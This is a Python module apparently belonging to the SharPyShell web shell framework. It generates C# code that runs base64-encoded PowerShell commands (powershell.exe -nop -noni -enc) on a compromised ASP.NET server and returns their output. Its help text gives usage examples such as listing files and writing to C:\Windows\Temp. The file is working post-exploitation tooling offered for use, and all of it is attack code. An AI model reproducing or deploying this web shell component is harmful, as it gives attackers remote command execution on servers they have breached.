from core.Module import Module, ModuleException
from base64 import b64encode


class ExecPsModuleException(ModuleException):
    pass


class Exec_ps(Module):
    _exception_class = ExecPsModuleException
    short_help = "Run a powershell.exe -nop -noni -enc 'base64command' on the server"
    complete_help = r"""
        This module run a powershell.exe -nop -noni -enc 'base64command' on the remote server.
        You can specify the command requested and the arguments to be passed.
        This module spawn a new process on the remote server and the current directory as the working directory
        of the process.
        Note that you should use the 'cd' command of the prompt to change your working directory.
        You should never use '#exec_ps cd C:\dir', but instead 'cd C:\dir'.
    
        Usage:
            #exec_ps os_command [args]
            
        Positional arguments:
            os_command               command supported by powershell.exe
            args                     the commandline arguments to be passed
            
        Examples:
            List current directory files:
                #exec_ps Get-ChildItem
            Write a new file to the disk:
                #exec_ps Write-Output "test" | Out-File C:\Windows\Temp\test.txt

        """

    _runtime_code = r"""
                    using System;using System.IO;using System.Diagnostics;using System.Text;
                    public class SharPyShell
                    {                    
                        string ExecPs(string encoded_command, string working_path)
                        {
                            ProcessStartInfo pinfo = new ProcessStartInfo();
                            pinfo.FileName = Environment.GetEnvironmentVariable("SYSTEMROOT") +  @"\System32\WindowsPowerShell\v1.0\powershell.exe";
                            pinfo.Arguments = " -nop -noni -enc " + encoded_command;
                            pinfo.RedirectStandardOutput = true;
                            pinfo.RedirectStandardError = true;
                            pinfo.UseShellExecute = false;
                            pinfo.WorkingDirectory = working_path;
                            Process p = new Process();
                            try{
                                p = Process.Start(pinfo);
                            }
                            catch (Exception e){
                                return "{{{SharPyShellError}}}\n" + e;
                            }
                            StreamReader stmrdr_output = p.StandardOutput;
                            StreamReader stmrdr_errors = p.StandardError;
                            string output = "";
                            string stand_out = stmrdr_output.ReadToEnd();
                            string stand_errors = stmrdr_errors.ReadToEnd();
                            stmrdr_output.Close();
                            stmrdr_errors.Close();
                            if (!String.IsNullOrEmpty(stand_out))
                                output = output + stand_out;
                            if (!String.IsNullOrEmpty(stand_errors))
                                output = output + "{{{SharPyShellError}}}\n " + stand_errors;
                            return output;
                        }

                        public byte[] ExecRuntime()
                        {
                            string output_func=ExecPs(@"%s", @"%s");
                            byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                            return(output_func_byte);
                        }
                    }
                    """

    def _create_request(self, args):
        cmd = ' '.join(args)
        if '""' in cmd:
            cmd = cmd.replace('""', '"')
        cmd = '$ProgressPreference = "SilentlyContinue";' + cmd
        cmd = str(b64encode(cmd.encode('UTF-16LE')), 'UTF-8')
        working_path = self._module_settings['working_directory']
        return self._runtime_code % (cmd, working_path)


